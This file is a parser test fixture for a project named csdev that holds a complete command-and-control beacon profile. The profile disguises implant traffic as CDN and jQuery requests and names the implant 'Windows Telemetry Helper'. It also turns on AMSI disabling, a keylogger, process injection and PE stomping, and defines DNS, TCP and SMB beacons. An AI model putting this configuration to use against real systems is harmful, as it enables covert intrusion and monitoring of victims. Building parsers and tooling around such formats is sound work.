# ==========================================================================
# csdev :: profile/testdata/full.profile
#   综合语法样例 (解析器测试夹具), 覆盖全部顶层块与常见子块/写法:
#     set / 块 / 子块 / header / parameter / uri / output / metadata / id
#     变换链 (base64 base64url netbios netbiosu mask print uri-append
#             prepend append) / string / data / strrep / 注释 / 转义
# ==========================================================================

set sleeptime "45000";
set jitter    "12";
set killdate  "2027-01-01 00:00:00";

set sample_name "Windows Telemetry Helper";
set pipename    "top_##";
set obfuscate   "true";
set unknown_future_option "keep-me";

# ----------------------------------------------------------------- http-get
http-get {
    set uri "/cdn/1x1.gif /api/v1/ping /assets/app.js";

    client {
        header "Accept" "text/html,application/xhtml+xml";
        header "Accept-Language" "en-US,en;q=0.9";
        header "Cookie" "SID=abc123";
        header "User-Agent" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) csdev-get";

        metadata {
            base64url;
            prepend "session=";
            parameter "sess";
        }
    }

    server {
        header "Content-Type" "image/gif";
        header "Cache-Control" "no-store";

        output {
            mask;
            print;
        }
    }
}

# ---------------------------------------------------------------- http-post
http-post {
    set uri "/api/v1/events";
    set verb "POST";
    set useragent "csdev-post-agent";

    client {
        header "Content-Type" "application/octet-stream";
        header "Accept" "*/*";

        id {
            base64;
            header "X-Session-Id";
        }

        output {
            base64url;
            prepend "data=";
            parameter "d";
        }
    }

    server {
        header "Content-Type" "text/plain";

        output {
            print;
        }
    }
}

# -------------------------------------------------------------- http-stager
http-stager {
    set uri_x86 "/jquery/jquery.min.js";
    set uri_x64 "/jquery/jquery-3.7.1.min.js";

    client {
        parameter "id" "42";
        header "Referer" "https://www.example.com/index.html";
    }

    server {
        header "Content-Type" "application/javascript";

        output {
            print;
        }
    }
}

# -------------------------------------------------------------- http-config
http-config {
    set headers "Server: nginx" "X-Powered-By: PHP/8.2";
    set trust_x_forwarded_for "true";
    set block_useragents "curl,wget";
    set allow_useragents "Mozilla*, Opera*";
}

# --------------------------------------------------------- https-certificate
https-certificate {
    set keystore "certs/dev.store";
    set password "changeit";
    set validity "365";
    set CN "www.example.com";
    set O  "Example Corp";
    set OU "IT Operations";
    set C  "US";
    set L  "New York";
    set ST "New York";
}

# ------------------------------------------------------------------ post-ex
post-ex {
    set spawnto_x86 "%windir%\\SysWOW64\\rundll32.exe";
    set spawnto_x64 "%windir%\\System32\\rundll32.exe";
    set obfuscate   "true";
    set smartinject "true";
    set amsi_disable "true";
    set keylogger   "GetAsyncKeyState";
    set cleanup     "true";
    set pipename    "postex_##";
}

# ----------------------------------------------------------- process-inject
process-inject {
    set allocator "NtMapViewOfSection";
    set min_alloc "17500";
    set startrwx  "false";
    set userwx    "false";
    set image     "true";
    set execute   "CreateThread" "RtlCreateUserThread";

    transform-x86 {
        prepend "AAA";
    }

    # "set 名字 { ... }" 形式同样被接受
    set transform-x64 {
        prepend "BBBB";
        append  "CCCC";
    }
}

# -------------------------------------------------------------------- stage
stage {
    set checksum     "0";
    set compile_time "14 Jun 2021 12:00:00 GMT";
    set entry_point  "123456";
    set image_size_x86 "512000";
    set image_size_x64 "512000";
    set name         "npmproxy.dll";
    set rich_header  "0x00000000";
    set allocator    "HeapAlloc";
    set obfuscate    "true";
    set stomppe      "true";
    set cleanup      "true";
    set userwx       "false";

    string "WWWWWWWWWWWWWWWW";
    string "dGVzdA==";
    strrep "AAAAAAAA" "BBBBBBBB";
    data   "4d5a900003000000";
    data   "04000000";
}

# --------------------------------------------------------------- dns-beacon
dns-beacon {
    set maxdns    "200";
    set beacon    "cdn.example.com";
    set get_A     "www.";
    set get_AAAA  "ipv6.";
    set get_TXT   "txt.";
    set put_metadata "meta.";
    set put_output   "out.";
    set dns_idle  "0.0.0.0";
    set dns_ttl   "5";
}

# --------------------------------------------------------------- tcp-beacon
tcp-beacon {
    set port "4444";
    set pipename "tcp_##";
    set pipename_stager "tcpstg_##";
}

# --------------------------------------------------------------- smb-beacon
smb-beacon {
    set pipename "msagent_##";
    set pipename_stager "status_##";
}
